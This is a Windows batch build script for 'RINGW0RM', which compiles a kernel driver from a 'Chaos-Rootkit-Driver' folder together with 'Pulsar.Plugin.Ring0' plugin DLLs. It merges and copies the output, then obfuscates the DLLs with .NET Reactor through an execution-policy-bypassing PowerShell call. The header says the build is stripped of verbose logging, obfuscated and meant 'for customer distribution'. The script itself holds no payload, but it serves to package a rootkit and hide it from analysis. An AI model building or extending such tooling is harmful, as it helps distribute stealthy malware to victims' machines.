@echo off
REM ============================================================
REM RINGW0RM RELEASE Build Script v2.0
REM Sanitized logging, hardened, obfuscated
REM For production/customer distribution
REM ============================================================

setlocal enabledelayedexpansion

set "PROJECT_DIR=%~dp0"
set "PLUGINS_DIR=%PROJECT_DIR%plugins"
set "DRIVER_DIR=%PROJECT_DIR%Chaos-Rootkit-Driver"
set "NET_REACTOR=%PROJECT_DIR%Obfuscator\dotNET_Reactor.Console.exe"
set "ILREPACK=%USERPROFILE%\.nuget\packages\ilrepack\2.0.34\tools\ILRepack.exe"

echo ============================================================
echo  RINGW0RM RELEASE Build v2.0
echo ============================================================
echo  - Verbose logging stripped
echo  - No debug symbols
echo  - DLL obfuscation enabled
echo  - Driver hardened (ASLR, DEP, etc)
echo  - Common.dll merged into Client.dll
echo ============================================================
echo.

if not exist "%PLUGINS_DIR%" mkdir "%PLUGINS_DIR%"

REM ============================================================
REM Step 1: Build Kernel Driver (Release - hardened) FIRST
REM ============================================================
echo [1/5] Building Kernel Driver (Release)...
call "%PROJECT_DIR%build_driver_release.bat"
if errorlevel 1 goto BUILD_FAILED
echo       Driver built (hardened).
echo.

REM ============================================================
REM Step 2: Build C# Solution (Release)
REM ============================================================
echo [2/5] Building C# Solution (Release)...
dotnet build "%PROJECT_DIR%Pulsar.Plugin.Ring0.sln" -c Release --nologo -v minimal
if errorlevel 1 goto BUILD_FAILED
echo       C# projects built successfully.
echo.

REM ============================================================
REM Step 3: Merge Common.dll into Client.dll
REM ============================================================
echo [3/5] Merging Common.dll into Client.dll...

set "CLIENT_SRC=%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\Release\net48\Pulsar.Plugin.Ring0.Client.dll"
set "COMMON_SRC=%PROJECT_DIR%Pulsar.Plugin.Ring0.Common\bin\Release\net48\Pulsar.Plugin.Ring0.Common.dll"
set "CLIENT_MERGED=%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\Release\net48\Pulsar.Plugin.Ring0.Client.merged.dll"

REM Check for ILRepack
if not exist "%ILREPACK%" (
    echo       ILRepack not found, trying to restore...
    dotnet restore "%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\Pulsar.Plugin.Ring0.Client.csproj" --nologo >nul 2>&1
)

REM Merge Common.dll into Client.dll
if exist "%ILREPACK%" (
    "%ILREPACK%" /out:"%CLIENT_MERGED%" /lib:"%PROJECT_DIR%Pulsar.Plugin.Ring0.Client\bin\Release\net48" "%CLIENT_SRC%" "%COMMON_SRC%"
    if exist "%CLIENT_MERGED%" (
        move /Y "%CLIENT_MERGED%" "%CLIENT_SRC%" >nul
        echo       Merge successful - Common.dll embedded into Client.dll
    ) else (
        echo       WARNING: Merge failed
    )
) else (
    echo       WARNING: ILRepack not available
)
echo.

REM ============================================================
REM Step 4: Copy to plugins folder
REM ============================================================
echo [4/5] Copying to plugins folder...
copy /Y "%CLIENT_SRC%" "%PLUGINS_DIR%\" >nul
copy /Y "%PROJECT_DIR%Pulsar.Plugin.Ring0.Common\bin\Release\net48\Pulsar.Plugin.Ring0.Common.dll" "%PLUGINS_DIR%\" >nul
copy /Y "%PROJECT_DIR%Pulsar.Plugin.Ring0.Server\bin\Release\net9.0-windows\Pulsar.Plugin.Ring0.Server.dll" "%PLUGINS_DIR%\" >nul
copy /Y "%DRIVER_DIR%\x64\Release\ringw0rm.sys" "%PLUGINS_DIR%\" >nul
echo       Files copied.
echo.

REM ============================================================
REM Step 5: Obfuscate DLLs (release only)
REM ============================================================
echo [5/5] Obfuscating DLLs...
powershell -ExecutionPolicy Bypass -File "%PROJECT_DIR%obfuscate.ps1"
if errorlevel 1 goto BUILD_FAILED
echo.

echo ============================================================
echo  RELEASE BUILD COMPLETE
echo ============================================================
echo  Output: %PLUGINS_DIR%
echo  
echo  Security features:
echo    [x] Verbose logging stripped (LogVerbose removed)
echo    [x] DLL obfuscation applied
echo    [x] Driver hardened (DYNAMICBASE, HIGHENTROPYVA, NXCOMPAT)
echo    [x] No debug symbols
echo    [x] Common.dll merged into Client.dll
echo ============================================================

endlocal
exit /b 0

:BUILD_FAILED
echo.
echo ERROR: Build failed!
endlocal
exit /b 1
